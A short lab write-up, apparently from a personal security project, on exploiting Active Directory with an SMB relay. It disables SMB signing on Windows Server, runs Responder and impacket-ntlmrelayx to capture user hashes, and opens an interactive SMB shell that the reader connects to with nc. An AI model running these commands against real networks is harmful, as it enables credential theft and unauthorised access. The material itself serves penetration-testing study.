# This will be a writeup showcasing the exploitation of common active directory vulnerabilities 
# Scope: Kali VM (attacker), x2 Windows Server 2019 (AD)
# Network: All on one LAN

# Currently will encompass the following (subject to change overtime as more is added)
# Key Technologies used: Mimikatz
# Different attacks: Pass the Hash (PtH), SMB Relay, Kerberoasting.

If you want a pre-built machine use something like this, this will contain several different pre-made vulns to exploit
# Vulnerable AD Script:
https://github.com/safebuffer/vulnerable-AD

To create your own begin by installing a windows server os, in this lab we'll use Windows Server 2019
Install ADDS on both Windows machines
Promote the first on to DC

Turn off smb signing
Disable SMB signing for outbound (client-side)
  Set-SmbClientConfiguration -RequireSecuritySignature $false
Disable SMB signing for inbound (server-side)
  Set-SmbServerConfiguration -RequireSecuritySignature $false

Add some new users
Go to computer management -> local users and groups -> users: add users if you want/need
Password policy: when creating these users, windows, by default, enforces certain password complexity, if you plan to brute force or crack hashes -
it may be a good idea to remove password complexity. in windows seearch bar -> type security -> select local security policy -> account policies -> password policy

From your Kali box use nmap to scan the target machine:
  - Port 445 should be open running the microsoft-ds service
  - Smb signing should show as enabled but not required

Next run responder from Kali box
Ensure that http and smb servers are off in the responder config file
sudo nano /etc/responder/Responder.conf --> simply change the value On to Off

Open responder and start its listener with:
sudo responder responder -I [net interface] -dPv

Next start ntlmrelay, if using the preinstalled version on kali this command looks like
impacket-ntlmrelayx -tf target.txt -smb2support
This command is a basic connect that will listen to our responder instance which will in turn send events to this listener

Now if you enter \\wow (a folder that does not exist on the AD) then it should pop up a window to input user credentials.
This should return a list of users and their hashes in our ntlmrelay terminal

Additionally, if we simply add the flag -i  onto our previous impacket-ntlmrelayx command we can start a shell on the victim's machine.
In the output it should show that an smb client shell has been started along with a ip and port 
Now if we open up another terminal windows we can use nc [ip] [port] and it will connect to our shell
From here we can now navigate the victim machines file directory

